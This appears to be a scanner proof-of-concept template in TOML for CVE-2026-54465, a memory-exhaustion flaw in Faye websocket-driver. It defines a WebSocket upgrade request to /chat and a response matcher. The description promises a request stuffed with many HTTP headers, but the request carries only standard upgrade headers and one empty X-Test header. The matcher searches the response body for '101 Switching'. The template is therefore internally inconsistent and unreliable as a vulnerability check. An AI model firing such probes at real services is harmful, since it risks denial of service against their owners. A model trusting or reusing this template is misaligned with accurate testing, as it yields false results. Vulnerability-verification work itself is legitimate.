[info]
author = "AVE"
description = "通过 HTTP 连接向使用 websocket-driver 的服务发送包含大量 HTTP 头部的 WebSocket 升级请求，验证 CVE-2026-54465 内存耗尽漏洞。漏洞源于 HTTP 解析器未限制头部大小，导致单连接可消耗无上限内存。"
id = "POC-AVE-2026-0536"
name = "Faye websocket-driver HTTP 头部解析内存耗尽 PoC"
severity = "medium"
tags = ["ave-2026-0536"]
vuln_id = [
    "CVE-2026-54465",
    "AVE-2026-0536",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/chat"
protocol = "http"

[poc.requests.headers]
Connection = "Upgrade"
Sec-WebSocket-Key = "dGhlIHNhbXBsZSBub25jZQ=="
Sec-WebSocket-Version = "13"
Upgrade = "websocket"
X-Test = ""

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["101 Switching"]
